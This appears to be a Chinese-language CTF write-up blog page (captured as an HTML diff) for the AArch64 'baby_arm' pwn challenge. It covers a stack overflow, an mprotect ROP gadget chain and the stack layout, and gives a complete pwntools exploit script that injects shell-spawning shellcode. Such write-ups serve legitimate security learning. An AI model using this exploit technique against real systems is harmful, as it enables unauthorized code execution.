@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,ARM,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="baby_arm题如其名，这是一道arm下的pwn，用file查看了下文件信息 12zs0zrc@zs0zrc-PC:~/pwn/babyarm$ file arm_pwn arm_pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-">
+<meta name="keywords" content="pwn,ARM">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【上海市大学生网络安全大赛】pwn复现">
+<meta property="og:url" content="http://yoursite.com/2018/11/05/2018-11-5-【上海市大学生网络安全大赛】baby_arm复现/index.html">
+<meta property="og:site_name" content="zs0zrc">
+<meta property="og:description" content="baby_arm题如其名，这是一道arm下的pwn，用file查看了下文件信息 12zs0zrc@zs0zrc-PC:~/pwn/babyarm$ file arm_pwn arm_pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/picture/1541473106731.png">
+<meta property="og:updated_time" content="2019-01-02T08:09:57.594Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【上海市大学生网络安全大赛】pwn复现">
+<meta name="twitter:description" content="baby_arm题如其名，这是一道arm下的pwn，用file查看了下文件信息 12zs0zrc@zs0zrc-PC:~/pwn/babyarm$ file arm_pwn arm_pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-">
+<meta name="twitter:image" content="http://yoursite.com/picture/1541473106731.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/05/2018-11-5-【上海市大学生网络安全大赛】baby_arm复现/">
+
+
+
+
+
+  <title>【上海市大学生网络安全大赛】pwn复现 | zs0zrc</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zs0zrc</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/05/2018-11-5-【上海市大学生网络安全大赛】baby_arm复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zs0zrc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zs0zrc">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【上海市大学生网络安全大赛】pwn复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-05T10:10:05+08:00">
+                2018-11-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/11/05/2018-11-5-【上海市大学生网络安全大赛】baby_arm复现/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/05/2018-11-5-【上海市大学生网络安全大赛】baby_arm复现/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="baby-arm"><a href="#baby-arm" class="headerlink" title="baby_arm"></a>baby_arm</h3><p>题如其名，这是一道arm下的pwn，用file查看了下文件信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zs0zrc@zs0zrc-PC:~/pwn/babyarm$ file arm_pwn </span><br><span class="line">arm_pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped</span><br></pre></td></tr></table></figure>
+<p>这是一道aarch64的pwn题，我之前ubuntu的环境有点小问题，所以我配了一个deepin的环境<a href="https://zszcr.github.io/2018/11/05/arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">搭建教程</a></p>
+<p>安装下共享库    </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zs0zrc@zs0zrc-PC:~/pwn/babyarm$ apt-cache search "libc6" | grep arm  </span><br><span class="line">libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling)</span><br><span class="line">libc6-armel-cross - GNU C Library: Shared libraries (for cross-compiling)</span><br><span class="line">libc6-armhf-cross - GNU C Library: Shared libraries (for cross-compiling)</span><br><span class="line">libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)</span><br><span class="line">libc6-dev-armel-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)</span><br><span class="line">libc6-dev-armhf-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)</span><br><span class="line">zs0zrc@zs0zrc-PC:~/pwn/babyarm$ sudo apt-get install libc6-arm64-cross</span><br></pre></td></tr></table></figure>
+<p>用ida反编译了下文件，发现漏洞点很明显，就是一个栈溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_400818</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_400760();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Name:"</span>, <span class="number">5u</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;unk_411068, <span class="number">0x200</span>uLL);</span><br><span class="line">  sub_4007F0();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> sub_4007F0()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [xsp+10h] [xbp+10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v1, <span class="number">0x200</span>uLL); <span class="comment">//stack overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序先向bss段写入内容，然后再读取一个字符串，很明显这应该是用rop来做，但是我arm64的rop不是很会，arm64的汇编不是很懂，找不到gadget，就 ……..</p>
+<p>这里看了大佬的writeup，发现是用rop做，先利用rop执行mprotect函数，设置bss段为可执行，往bss段写入shellcode，然后去执行shellcode来getshell</p>
+<p>这里找的gadget类似于万用gadget</p>
+<p><img src="/picture/1541473106731.png" alt="1541473106731"></p>
+<p>先学习下amd64常用汇编指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MOV    X1，X0         ;将寄存器X0的值传送到寄存器X1</span><br><span class="line">ADD    X0，X1，X2     ;寄存器X1和X2的值相加后传送到X0</span><br><span class="line">SUB    X0，X1，X2     ;寄存器X1和X2的值相减后传送到X0</span><br><span class="line">AND    X0，X0，#0xF    ; X0的值与0xF相位与后的值传送到X0</span><br><span class="line">ORR    X0，X0，#9      ; X0的值与9相位或后的值传送到X0</span><br><span class="line">EOR    X0，X0，#0xF    ; X0的值与0xF相异或后的值传送到X0</span><br><span class="line">LDR    X5，[X6，#0x08]        ；X6寄存器加0x08的和的地址值内的数据传送到X5</span><br><span class="line">STR X0, [SP, #0x8]         ；X0寄存器的数据传送到SP+0x8地址值指向的存储空间</span><br><span class="line">STP  x29, x30, [sp, #0x10]    ;入栈指令</span><br><span class="line">LDP  x29, x30, [sp, #0x10]    ;出栈指令</span><br><span class="line">CBZ  ;比较（Compare），如果结果为零（Zero）就转移（只能跳到后面的指令）</span><br><span class="line">CBNZ ;比较，如果结果非零（Non Zero）就转移（只能跳到后面的指令）</span><br><span class="line">CMP  ;比较指令，相当于SUBS，影响程序状态寄存器CPSR </span><br><span class="line">B/BL  ;绝对跳转#imm， 返回地址保存到LR（X30）</span><br><span class="line">RET   ;子程序返回指令，返回地址默认保存在LR（X30）</span><br></pre></td></tr></table></figure>
+<p>然后分析下这个gadget，通过loc_4008CC 函数，可以控制x19,x20,x21,x22,x23,x24,x29和x30寄存器的内容，而x30寄存器存储着返回地址，通过loc_4008AC函数，可以控制w0,x1,x2,x3寄存器的内容，并且可以执行call x3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">loc_4008AC                            ; CODE XREF: sub_400868+60↓j</span><br><span class="line">                 LDR             X3, [X21,X19,LSL#3] ;将x21寄存器的地址指向的内容赋给x3寄存器</span><br><span class="line">                 MOV             X2, X22	;将x22寄存器的内容赋给x2</span><br><span class="line">                 MOV             X1, X23	;将x23寄存器的内容赋给x1</span><br><span class="line">                 MOV             W0, W24	;将W24寄存器的内容赋给W0</span><br><span class="line">                 ADD             X19, X19, #1	;x19寄存器加一</span><br><span class="line">                 BLR             X3	；跳转到x3寄存器指向的地址</span><br><span class="line">                 CMP             X19, X20	；比较x19和x20是否相等</span><br><span class="line">                 B.NE            loc_4008AC	；如果不相等，就跳回loc_4008AC继续执行</span><br><span class="line"></span><br><span class="line">loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span><br><span class="line">                 LDP             X19, X20, [SP,#0x10]	;将sp+0x10,sp+0x18处的内容给x19,x20</span><br><span class="line">                 LDP             X21, X22, [SP,#0x20]	;将sp+0x20,sp+0x28处的内容给x21,x22</span><br><span class="line">                 LDP             X23, X24, [SP,#0x30]	;将sp+0x30,sp+0x38处的内容给x23,x24</span><br><span class="line">                 LDP             X29, X30, [SP],#0x40	;将sp,sp+0x8处的内容给x29,x30</span><br><span class="line">                 RET</span><br></pre></td></tr></table></figure>
+<p>布置好的栈如下，在执行完loc_4008CC 函数后，x30为loc_4008AC 的地址，所以程序会跳转到loc_4008AC 函数，会将x21寄存器的地址指向的内容赋给x3寄存器，然后将对应的参数放入x0,x1,x2寄存器中，接着会执行blr x3语句，这相当于 call x3，所以就会调用构造好的mprotect(0x411000,0x1000,0x5)函数，调用完mprotect函数后会将继续向下执行，比较x19和x20是否相等，这里提前构造好，使它们相等，然后继续向下执行。执行一连串的ldp指令后，将shellcode的地址赋给x30,那么最后就会ret到shellcode处去执行它。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ sp  <span class="number">0x40007ffe40</span> ◂— <span class="number">0x0</span>	--&gt; x29</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x40007ffe48</span> —▸ <span class="number">0x4008ac</span> ◂— ldr    x3, [x21, x19, lsl #<span class="number">3</span>]	--&gt; x30</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x40007ffe50</span> ◂— <span class="number">0x0</span>	--&gt; x19	</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x40007ffe58</span> ◂— <span class="number">0x1</span>	--&gt; x20</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x40007ffe60</span> —▸ <span class="number">0x411168</span> —▸ <span class="number">0x400600</span> (mprotect@plt) --&gt; x21 --&gt;x3</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x40007ffe68</span> ◂— <span class="number">0x5</span>	--&gt; x22	--&gt;x2</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x40007ffe70</span> ◂— <span class="number">0x1000</span>  --&gt;x23	--&gt;x1</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x40007ffe78</span> —▸ <span class="number">0x411000</span> --&gt;x24--&gt;w0</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x40007ffe80</span> ◂— <span class="number">0x0</span>	</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x40007ffe88</span> —▸ <span class="number">0x411068</span> --&gt;下一个x30,shellcode的地址</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│     <span class="number">0x40007ffe90</span> ◂— <span class="number">0xdeadbeef</span>	*<span class="number">6</span></span><br><span class="line">			...........</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>这里用pwntools生成aarch64的shellcode会报错 解决方法(Ubuntu下)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install software-properties-common</span><br><span class="line">$ sudo apt-add-repository ppa:pwntools/binutils</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install binutils-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = remote(<span class="string">"106.75.126.171"</span>,<span class="string">"33865"</span>)</span><br><span class="line"><span class="keyword">elif</span> debug:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"pwn"</span>)</span><br><span class="line">context.binary = <span class="string">"pwn"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(content)</span><br><span class="line">    </span><br><span class="line">buf = asm(shellcraft.aarch64.sh())</span><br><span class="line">buf = buf.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">buf += p64(<span class="number">0x400600</span>)	<span class="comment">#这里是存放mprotect函数的地址</span></span><br><span class="line"></span><br><span class="line">size = <span class="number">72</span></span><br><span class="line">gadget1 = <span class="number">0x4008CC</span></span><br><span class="line">gadget2 = <span class="number">0x4008AC</span></span><br><span class="line">shellcode_add = <span class="number">0x411068</span></span><br><span class="line">mprotect_add = <span class="number">0x411168</span></span><br><span class="line">payload = cyclic(<span class="number">72</span>) + flat([gadget1 , <span class="number">0</span> , gadget2 , <span class="number">0</span> , <span class="number">1</span> , mprotect_add , <span class="number">5</span> , <span class="number">0x1000</span> , <span class="number">0x411000</span> , <span class="number">0</span> , shellcode_add] , [<span class="number">0xdeadbeef</span>]*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line">sl(buf)</span><br><span class="line">sl(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="momo-serve"><a href="#momo-serve" class="headerlink" title="momo_serve"></a>momo_serve</h3>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/ARM/" rel="tag"># ARM</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/30/2018-10-30-tcache下的堆利用的学习/" rel="next" title="tcache下的堆利用的学习">
+                <i class="fa fa-chevron-left"></i> tcache下的堆利用的学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/05/2018-11-5-arm-pwn环境搭建/" rel="prev" title="arm-pwn环境搭建">
+                arm-pwn环境搭建 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
+            
+              <p class="site-author-name" itemprop="name">zs0zrc</p>
+              <p class="site-description motion-element" itemprop="description">zs0zrc's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://myhackerworld.top/" title="D4rk3r" target="_blank">D4rk3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://m4x.fun/" title="M4X" target="_blank">M4X</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-arm"><span class="nav-number">1.</span> <span class="nav-text">baby_arm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#momo-serve"><span class="nav-number">2.</span> <span class="nav-text">momo_serve</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
